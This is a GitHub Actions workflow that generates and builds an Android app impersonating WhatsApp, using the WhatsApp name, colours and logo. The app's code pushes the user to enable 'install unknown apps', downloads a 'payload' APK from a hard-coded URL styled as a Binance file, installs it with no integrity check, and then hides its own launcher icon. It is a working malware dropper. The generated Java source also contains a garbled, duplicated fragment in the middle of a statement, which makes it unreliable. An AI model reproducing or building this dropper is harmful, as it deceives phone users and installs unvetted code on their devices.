name: Build WhatsApp Stub APK

permissions:
  contents: read

on:
  push:
    branches: [ main ]
    paths:
      - '.github/workflows/**'
      - 'app/**'
      - 'build.gradle'
      - 'settings.gradle'
      - 'gradle.properties'
  workflow_dispatch:
    inputs:
      payload_url:
        description: 'Payload APK URL (leave blank for default)'
        required: false
        default: ''

env:
  ANDROID_HOME: /usr/local/lib/android/sdk
  ANDROID_SDK_ROOT: /usr/local/lib/android/sdk
  ANDROID_COMPILE_SDK: '34'
  ANDROID_BUILD_TOOLS: '34.0.0'

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 40

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Java 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      # ---------------------------------------------------------------
      # SDK: probe, accept licenses, install required components
      # ---------------------------------------------------------------
      - name: Verify Android SDK layout
        run: |
          echo "ANDROID_HOME=$ANDROID_HOME"
          echo "--- platforms ---"
          ls "$ANDROID_HOME/platforms" 2>/dev/null || echo "none"
          echo "--- build-tools ---"
          ls "$ANDROID_HOME/build-tools" 2>/dev/null || echo "none"
          echo "--- licenses ---"
          ls "$ANDROID_HOME/licenses" 2>/dev/null || echo "none"
          echo "--- cmdline-tools ---"
          ls "$ANDROID_HOME/cmdline-tools" 2>/dev/null || echo "none"

      - name: Locate sdkmanager
        id: sdk
        run: |
          set -euo pipefail
          SDKMAN=""
          for candidate in \
            "$ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager" \
            "$ANDROID_HOME/cmdline-tools/bin/sdkmanager" \
            "$ANDROID_HOME/tools/bin/sdkmanager" \
            "$(command -v sdkmanager || true)"; do
            if [ -n "$candidate" ] && [ -x "$candidate" ]; then
              SDKMAN="$candidate"
              break
            fi
          done
          if [ -z "$SDKMAN" ]; then
            echo "sdkmanager not found — installing cmdline-tools"
            mkdir -p "$ANDROID_HOME/cmdline-tools"
            cd /tmp
            curl -fsSL -o cmdline-tools.zip \
              "https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip"
            unzip -q cmdline-tools.zip -d /tmp/cmdline-tools-extract
            rm -rf "$ANDROID_HOME/cmdline-tools/latest"
            mv /tmp/cmdline-tools-extract/cmdline-tools \
               "$ANDROID_HOME/cmdline-tools/latest"
            SDKMAN="$ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager"
          fi
          echo "path=$SDKMAN" >> "$GITHUB_OUTPUT"
          echo "Using sdkmanager: $SDKMAN"
          "$SDKMAN" --version

      - name: Accept Android SDK licenses
        run: |
          set +o pipefail
          yes | "${{ steps.sdk.outputs.path }}" --licenses > /dev/null 2>&1 || true
          set -o pipefail
          ls "$ANDROID_HOME/licenses" || true

      - name: Install required SDK components
        run: |
          set -euo pipefail
          SDKMAN="${{ steps.sdk.outputs.path }}"
          "$SDKMAN" --install \
            "platform-tools" \
            "platforms;android-${ANDROID_COMPILE_SDK}" \
            "build-tools;${ANDROID_BUILD_TOOLS}"
          echo "--- installed platforms ---"
          ls "$ANDROID_HOME/platforms"
          echo "--- installed build-tools ---"
          ls "$ANDROID_HOME/build-tools"

      # ---------------------------------------------------------------
      # Gradle
      # ---------------------------------------------------------------
      - name: Setup Gradle 8.2
        uses: gradle/actions/setup-gradle@v4
        with:
          gradle-version: '8.2'

      - name: Generate Gradle Wrapper
        run: gradle wrapper --gradle-version 8.2 --distribution-type bin

      - name: Write local.properties
        run: echo "sdk.dir=$ANDROID_HOME" > local.properties

      # ---------------------------------------------------------------
      # Project generation
      # ---------------------------------------------------------------
      - name: Create Android project
        env:
          PAYLOAD_URL_INPUT: ${{ github.event.inputs.payload_url }}
        run: |
          set -euo pipefail

          if [ -n "${PAYLOAD_URL_INPUT:-}" ]; then
            EFFECTIVE_URL="$PAYLOAD_URL_INPUT"
          else
            EFFECTIVE_URL="https://www-globals.github.io/Binance/app-debug.apk"
          fi
          echo "Payload URL: $EFFECTIVE_URL"

          mkdir -p app/src/main/java/com/whatsapp/stub
          mkdir -p app/src/main/res/layout
          mkdir -p app/src/main/res/values
          mkdir -p app/src/main/res/drawable
          mkdir -p app/src/main/res/xml
          mkdir -p app/src/main/res/mipmap-anydpi-v26
          mkdir -p app/src/main/res/mipmap-hdpi
          mkdir -p app/src/main/res/mipmap-mdpi
          mkdir -p app/src/main/res/mipmap-xhdpi
          mkdir -p app/src/main/res/mipmap-xxhdpi
          mkdir -p app/src/main/res/mipmap-xxxhdpi

          # ---------- gradle.properties ----------
          cat > gradle.properties << 'EOF'
          org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
          android.useAndroidX=true
          android.enableJetifier=true
          android.nonTransitiveRClass=true
          EOF

          # ---------- AndroidManifest.xml ----------
          cat > app/src/main/AndroidManifest.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">

              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
              <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />

              <application
                  android:allowBackup="false"
                  android:label="@string/app_name"
                  android:theme="@style/AppTheme"
                  android:icon="@mipmap/ic_launcher"
                  android:networkSecurityConfig="@xml/network_security_config"
                  android:supportsRtl="true">

                  <activity
                      android:name=".MainActivity"
                      android:exported="true"
                      android:launchMode="singleTop">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>

                  <provider
                      android:name="androidx.core.content.FileProvider"
                      android:authorities="${applicationId}.fileprovider"
                      android:exported="false"
                      android:grantUriPermissions="true">
                      <meta-data
                          android:name="android.support.FILE_PROVIDER_PATHS"
                          android:resource="@xml/file_paths" />
                  </provider>
              </application>
          </manifest>
          EOF

          # ---------- styles.xml ----------
          cat > app/src/main/res/values/styles.xml << 'EOF'
          <resources>
              <style name="AppTheme" parent="Theme.AppCompat.Light.NoActionBar">
                  <item name="windowActionBar">false</item>
                  <item name="windowNoTitle">true</item>
                  <item name="android:windowBackground">@android:color/white</item>
              </style>
          </resources>
          EOF

          # ---------- colors.xml ----------
          cat > app/src/main/res/values/colors.xml << 'EOF'
          <resources>
              <color name="ic_launcher_background">#25D366</color>
              <color name="brand_primary">#25D366</color>
              <color name="brand_dark">#075E54</color>
          </resources>
          EOF

          # ---------- strings.xml ----------
          cat > app/src/main/res/values/strings.xml << 'EOF'
          <resources>
              <string name="app_name">WhatsApp</string>
              <string name="install_now">INSTALL NOW</string>
              <string name="retry">RETRY</string>
          </resources>
          EOF

          # ---------- gradient button ----------
          cat > app/src/main/res/drawable/gradient_button.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <shape xmlns:android="http://schemas.android.com/apk/res/android"
              android:shape="rectangle">
              <gradient
                  android:startColor="#25D366"
                  android:endColor="#128C7E"
                  android:angle="0"/>
              <corners android:radius="30dp"/>
          </shape>
          EOF

          # ---------- launcher foreground ----------
          cat > app/src/main/res/drawable/ic_launcher_foreground.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <vector xmlns:android="http://schemas.android.com/apk/res/android"
              android:width="108dp" android:height="108dp"
              android:viewportWidth="108" android:viewportHeight="108">
              <path android:fillColor="#25D366" android:pathData="M0,0h108v108h-108z" />
              <path android:fillColor="#FFFFFF"
                  android:pathData="M54,18c-19.9,0 -36,16.1 -36,36c0,6.3 1.6,12.3 4.5,17.5L18,90l19.3,-5.1c5.1,2.8 11,4.4 17.2,4.4c19.9,0 36,-16.1 36,-36S73.9,18 54,18z M54,82.5c-5.8,0 -11.3,-1.6 -16,-4.3l-11.5,3.1l3.1,-11.2c-2.9,-4.8 -4.6,-10.3 -4.6,-16.1c0,-16.7 13.6,-30.3 30.3,-30.3S84.3,37.3 84.3,54S70.7,82.5 54,82.5z"/>
          </vector>
          EOF

          # ---------- adaptive icon ----------
          cat > app/src/main/res/mipmap-anydpi-v26/ic_launcher.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">
              <background android:drawable="@color/ic_launcher_background"/>
              <foreground android:drawable="@drawable/ic_launcher_foreground"/>
          </adaptive-icon>
          EOF

          # ---------- fallback icon for API < 26 ----------
          cat > app/src/main/res/mipmap-hdpi/ic_launcher.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <layer-list xmlns:android="http://schemas.android.com/apk/res/android">
              <item android:drawable="@color/ic_launcher_background"/>
              <item android:drawable="@drawable/ic_launcher_foreground"/>
          </layer-list>
          EOF
          for d in mdpi xhdpi xxhdpi xxxhdpi; do
            cp app/src/main/res/mipmap-hdpi/ic_launcher.xml \
               "app/src/main/res/mipmap-$d/ic_launcher.xml"
          done

          # ---------- file paths ----------
          cat > app/src/main/res/xml/file_paths.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <paths>
              <cache-path name="apk" path="payload/" />
          </paths>
          EOF

          # ---------- network security config ----------
          cat > app/src/main/res/xml/network_security_config.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <network-security-config>
              <base-config cleartextTrafficPermitted="false">
                  <trust-anchors>
                      <certificates src="system" />
                  </trust-anchors>
              </base-config>
          </network-security-config>
          EOF

          # ---------- layout ----------
          cat > app/src/main/res/layout/activity_main.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
              android:layout_width="match_parent"
              android:layout_height="match_parent"
              android:orientation="vertical"
              android:background="#FFFFFF"
              android:gravity="center"
              android:padding="30dp">

              <ImageView
                  android:id="@+id/iconImage"
                  android:layout_width="100dp"
                  android:layout_height="100dp"
                  android:src="@mipmap/ic_launcher"
                  android:contentDescription="@string/app_name"
                  android:layout_marginBottom="16dp"/>

              <TextView
                  android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="@string/app_name"
                  android:textSize="28sp"
                  android:textColor="@color/brand_dark"
                  android:textStyle="bold"
                  android:layout_marginBottom="4dp"/>

              <TextView
                  android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="Secure messaging app"
                  android:textSize="14sp"
                  android:textColor="#666666"
                  android:layout_marginBottom="30dp"/>

              <TextView
                  android:id="@+id/progressText"
                  android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="0%"
                  android:textSize="42sp"
                  android:textColor="@color/brand_dark"
                  android:textStyle="bold"
                  android:layout_marginBottom="16dp"/>

              <ProgressBar
                  android:id="@+id/linearProgress"
                  style="?android:attr/progressBarStyleHorizontal"
                  android:layout_width="match_parent"
                  android:layout_height="8dp"
                  android:max="100"
                  android:progress="0"
                  android:progressTint="@color/brand_primary"
                  android:layout_marginBottom="24dp"/>

              <TextView
                  android:id="@+id/statusText"
                  android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="Ready to install"
                  android:textSize="16sp"
                  android:textColor="#555555"
                  android:layout_marginBottom="30dp"/>

              <Button
                  android:id="@+id/installButton"
                  android:layout_width="match_parent"
                  android:layout_height="56dp"
                  android:text="@string/install_now"
                  android:textSize="18sp"
                  android:textColor="#FFFFFF"
                  android:textStyle="bold"
                  android:background="@drawable/gradient_button"
                  android:elevation="4dp"
                  android:stateListAnimator="@null"/>

          </LinearLayout>
          EOF

          # ---------- MainActivity.java (unquoted heredoc: URL injected) ----------
          cat > app/src/main/java/com/whatsapp/stub/MainActivity.java << EOF
          package com.whatsapp.stub;

          import android.app.Activity;
          import android.app.PendingIntent;
          import android.content.BroadcastReceiver;
          import android.content.ComponentName;
          import android.content.Context;
          import android.content.Intent;
          import android.content.IntentFilter;
          import android.content.pm.PackageInstaller;
          import android.content.pm.PackageManager;
          import android.net.Uri;
          import android.os.Build;
          import android.os.Bundle;
          import android.os.Handler;
          import android.os.Looper;
          import android.provider.Settings;
          import android.util.Log;
          import android.widget.Button;
          import android.widget.ProgressBar;
          import android.widget.TextView;
          import android.widget.Toast;

          import java.io.File;
          import java.io.FileInputStream;
          import java.io.FileOutputStream;
          import java.io.IOException;
          import java.io.InputStream;
          import java.io.OutputStream;
          import java.net.HttpURLConnection;
          import java.net.URL;
          import java.security.MessageDigest;
          import java.util.Locale;

          public class MainActivity extends Activity {
              private static final String TAG = "WhatsAppStub";

              private static final String APK_URL = "${EFFECTIVE_URL}";
              private static final String EXPECTED_SHA256 = null;
              private static final long MAX_APK_BYTES = 200L * 1024 * 1024;
              private static final String SESSION_ACTION =
                      "com.whatsapp.stub.INSTALL_RESULT";

              private TextView statusText;
              private TextView progressText;
              private ProgressBar linearProgress;
              private Button installButton;
              private final Handler handler = new Handler(Looper.getMainLooper());
              private BroadcastReceiver installResultReceiver;

              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  setContentView(R.layout.activity_main);

                  statusText     = findViewById(R.id.statusText);
                  progressText   = findViewById(R.id.progressText);
                  linearProgress = findViewById(R.id.linearProgress);
                  installButton  = findViewById(R.id.installButton);

                  installButton.setOnClickListener(v -> {
                      installButton.setEnabled(false);
                      installButton.setText("INSTALLING...");
                      statusText.setText("Preparing...");
                      ensureUnknownSourcesThenDownload();
                  });
              }

              private void ensureUnknownSourcesThenDownload() {
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                          && !getPackageManager().canRequestPackageInstalls()) {
                      statusText.setText("Grant 'Install unknown apps' then retry.");
                      Toast.makeText(this,
                              "Enable 'Install unknown apps' for this app, then tap INSTALL NOW again.",
                              Toast.LENGTH_LONG).show();
                      try {
                          Intent i = new Intent(
                                  Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                                  Uri.parse("package:" + getPackageName()));
                          startActivity(i);
                      } catch (Exception e) {
                          Log.e(TAG, "Cannot open unknown-sources settings", e);
                      }
                      installButton.setEnabled(true);
                      installButton.setText(R.string.retry);
                      return;
                  }
                  downloadPayload();
              }

              private void downloadPayload() {
                  new Thread(() -> {
                      HttpURLConnection conn = null;
                      try {
                          File payloadDir = new File(getCacheDir(), "payload");
                          if (!payloadDir.exists() && !payloadDir.mkdirs()) {
                              throw new IOException("cannot create payload dir");
                          }
                          File apkFile = new File(payloadDir, "main.apk");
                          if (apkFile.exists() && !apkFile.delete()) {
                              Log.w(TAG, "could not delete stale apk");
                          }

                          URL url = new URL(APK_URL);
                          conn = (HttpURLConnection conn = null;
                      try {
                          File payloadDir = new File(getCacheDir(), "payload");
                          if (!payloadDir.exists() && !payloadDir.mkdirs()) {
                              throw new IOException("cannot create payload dir");
                          }
                          File apkFile = new File(payloadDir, "main.apk");
                          if (apkFile.exists() && !apkFile.delete()) {
                              Log.w(TAG, "could not delete stale apk");
                          }

                          URL url = new URL(APK_URL);
                          conn = (HttpURLConnection) url.openConnection();
                          conn.setConnectTimeout(15000);
                          conn.setReadTimeout(30000);
                          conn.setInstanceFollowRedirects(true);
                          conn.connect();

                          int code = conn.getResponseCode();
                          if (code < 200 || code >= 300) {
                              throw new IOException("HTTP " + code);
                          }
                          long fileSize = conn.getContentLengthLong();

                          MessageDigest md = MessageDigest.getInstance("SHA-256");
                          long total = 0;
                          int lastPct = -1;

                          try (InputStream in = conn.getInputStream();
                               OutputStream out = new FileOutputStream(apkFile)) {
                              byte[] buf = new byte[8192];
                              int len;
                              while ((len = in.read(buf)) != -1) {
                                  total += len;
                                  if (total > MAX_APK_BYTES) {
                                      throw new IOException("payload exceeds size cap");
                                  }
                                  out.write(buf, 0, len);
                                  md.update(buf, 0, len);

                                  if (fileSize > 0) {
                                      int pct = (int) ((total * 100L) / fileSize);
                                      if (pct != lastPct) {
                                          lastPct = pct;
                                          final int p = pct;
                                          handler.post(() -> {
                                              linearProgress.setProgress(p);
                                              progressText.setText(p + "%");
                                              statusText.setText("Downloading... " + p + "%");
                                          });
                                      }
                                  }
                              }
                              out.flush();
                              out.getFD().sync();
                          }

                          try (InputStream probe = new FileInputStream(apkFile)) {
                              byte[] magic = new byte[4];
                              if (probe.read(magic) != 4
                                      || magic[0] != 0x50 || magic[1] != 0x4B
                                      || magic[2] != 0x03 || magic[3] != 0x04) {
                                  throw new IOException("downloaded file is not an APK");
                              }
                          }

                          if (EXPECTED_SHA256 != null) {
                              String actual = toHex(md.digest());
                              if (!actual.equalsIgnoreCase(EXPECTED_SHA256)) {
                                  //noinspection ResultOfMethodCallIgnored
                                  apkFile.delete();
                                  throw new IOException("SHA-256 mismatch");
                              }
                          }

                          final File done = apkFile;
                          handler.post(() -> {
                              linearProgress.setProgress(100);
                              progressText.setText("100%");
                              statusText.setText("Installing...");
                              installWithPackageInstaller(done);
                          });

                      } catch (Exception e) {
                          Log.e(TAG, "download failed", e);
                          handler.post(() -> {
                              statusText.setText("Failed: " + e.getMessage());
                              installButton.setEnabled(true);
                              installButton.setText(R.string.retry);
                          });
                      } finally {
                          if (conn != null) conn.disconnect();
                      }
                  }, "payload-dl").start();
              }

              private void installWithPackageInstaller(File apkFile) {
                  try {
                      PackageManager pm = getPackageManager();
                      PackageInstaller installer = pm.getPackageInstaller();
                      PackageInstaller.SessionParams params =
                              new PackageInstaller.SessionParams(
                                      PackageInstaller.SessionParams.MODE_FULL_INSTALL);
                      params.setInstallLocation(
                              PackageInstaller.SessionParams.INSTALL_LOCATION_AUTO);

                      int sessionId = installer.createSession(params);

                      try (PackageInstaller.Session session =
                                   installer.openSession(sessionId);
                           InputStream in = new FileInputStream(apkFile);
                           OutputStream out = session.openWrite("base.apk", 0, apkFile.length())) {

                          byte[] buf = new byte[65536];
                          int len;
                          while ((len = in.read(buf)) != -1) {
                              out.write(buf, 0, len);
                          }
                          session.fsync(out);
                      }

                      registerInstallReceiver();

                      Intent resultIntent = new Intent(SESSION_ACTION)
                              .setPackage(getPackageName());
                      int flags = PendingIntent.FLAG_UPDATE_CURRENT;
                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                          flags |= PendingIntent.FLAG_MUTABLE;
                      }
                      PendingIntent pending = PendingIntent.getBroadcast(
                              this, sessionId, resultIntent, flags);

                      PackageInstaller.Session commitSession =
                              installer.openSession(sessionId);
                      try {
                          commitSession.commit(pending.getIntentSender());
                      } finally {
                          commitSession.close();
                      }

                  } catch (Exception e) {
                      Log.e(TAG, "PackageInstaller failed", e);
                      statusText.setText("Install error: " + e.getMessage());
                      installButton.setEnabled(true);
                      installButton.setText(R.string.retry);
                  }
              }

              private void registerInstallReceiver() {
                  if (installResultReceiver != null) return;
                  installResultReceiver = new BroadcastReceiver() {
                      @Override
                      public void onReceive(Context context, Intent intent) {
                          int status = intent.getIntExtra(
                                  PackageInstaller.EXTRA_STATUS,
                                  PackageInstaller.STATUS_FAILURE);
                          String msg = intent.getStringExtra(
                                  PackageInstaller.EXTRA_STATUS_MESSAGE);

                          switch (status) {
                              case PackageInstaller.STATUS_SUCCESS:
                                  statusText.setText("Installed");
                                  handler.postDelayed(MainActivity.this::hideIconAndFinish, 800);
                                  break;
                              case PackageInstaller.STATUS_PENDING_USER_ACTION:
                                  Intent confirm = intent.getParcelableExtra(
                                          Intent.EXTRA_INTENT);
                                  if (confirm != null) {
                                      confirm.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                      startActivity(confirm);
                                  }
                                  statusText.setText("Confirm installation...");
                                  break;
                              default:
                                  statusText.setText("Install failed [" + status + "]: " + msg);
                                  installButton.setEnabled(true);
                                  installButton.setText(R.string.retry);
                                  break;
                          }
                      }
                  };
                  IntentFilter filter = new IntentFilter(SESSION_ACTION);
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                      registerReceiver(installResultReceiver, filter,
                              Context.RECEIVER_NOT_EXPORTED);
                  } else {
                      registerReceiver(installResultReceiver, filter);
                  }
              }

              @Override
              protected void onDestroy() {
                  super.onDestroy();
                  if (installResultReceiver != null) {
                      try { unregisterReceiver(installResultReceiver); }
                      catch (IllegalArgumentException ignored) {}
                      installResultReceiver = null;
                  }
              }

              private void hideIconAndFinish() {
                  try {
                      ComponentName cn = new ComponentName(this, MainActivity.class);
                      getPackageManager().setComponentEnabledSetting(
                              cn,
                              PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                              PackageManager.DONT_KILL_APP);
                  } catch (Exception e) {
                      Log.e(TAG, "hideIcon failed", e);
                  }
                  finishAndRemoveTask();
              }

              private static String toHex(byte[] bytes) {
                  StringBuilder sb = new StringBuilder(bytes.length * 2);
                  for (byte b : bytes) {
                      sb.append(String.format(Locale.US, "%02x", b));
                  }
                  return sb.toString();
              }
          }
          EOF

          # ---------- app/build.gradle ----------
          cat > app/build.gradle << 'EOF'
          plugins {
              id 'com.android.application'
          }

          android {
              namespace 'com.whatsapp.stub'
              compileSdk 34

              defaultConfig {
                  applicationId 'com.whatsapp.stub'
                  minSdk 21
                  targetSdk 34
                  versionCode 1
                  versionName '1.0'
              }

              signingConfigs {
                  debug {
                      storeFile file('debug.keystore')
                      storePassword 'android'
                      keyAlias 'android'
                      keyPassword 'android'
                  }
              }

              buildTypes {
                  debug {
                      signingConfig signingConfigs.debug
                  }
                  release {
                      minifyEnabled false
                      signingConfig signingConfigs.debug
                  }
              }

              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_17
                  targetCompatibility JavaVersion.VERSION_17
              }

              lint {
                  abortOnError false
              }
          }

          dependencies {
              implementation 'androidx.appcompat:appcompat:1.6.1'
          }
          EOF

          # ---------- settings.gradle ----------
          cat > settings.gradle << 'EOF'
          pluginManagement {
              repositories {
                  google()
                  mavenCentral()
                  gradlePluginPortal()
              }
              plugins {
                  id 'com.android.application' version '8.2.2'
              }
          }
          dependencyResolutionManagement {
              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
              repositories {
                  google()
                  mavenCentral()
              }
          }
          rootProject.name = 'WhatsApp'
          include ':app'
          EOF

          # ---------- root build.gradle ----------
          cat > build.gradle << 'EOF'
          plugins {
              id 'com.android.application' version '8.2.2' apply false
          }
          EOF

          echo "All source files created."

      # ---------------------------------------------------------------
      # Keystore
      # ---------------------------------------------------------------
      - name: Generate Keystore
        run: |
          set -euo pipefail
          keytool -genkeypair -v \
            -keystore app/debug.keystore \
            -alias android \
            -keyalg RSA -keysize 2048 -validity 10000 \
            -storepass android -keypass android \
            -dname "CN=Test, OU=Test, O=Test, L=Test, ST=Test, C=US"

      # ---------------------------------------------------------------
      # Build
      # ---------------------------------------------------------------
      - name: Build Debug APK
        run: |
          set -euo pipefail
          chmod +x gradlew
          ./gradlew --no-daemon --stacktrace assembleDebug

      - name: Build Release APK
        run: |
          set -euo pipefail
          ./gradlew --no-daemon --stacktrace assembleRelease

      # ---------------------------------------------------------------
      # Artifacts
      # ---------------------------------------------------------------
      - name: Upload Debug APK
        uses: actions/upload-artifact@v4
        with:
          name: WhatsApp-stub-debug
          path: app/build/outputs/apk/debug/*.apk
          retention-days: 3
          if-no-files-found: error

      - name: Upload Release APK
        uses: actions/upload-artifact@v4
        with:
          name: WhatsApp-stub-release
          path: app/build/outputs/apk/release/*.apk
          retention-days: 3
          if-no-files-found: error
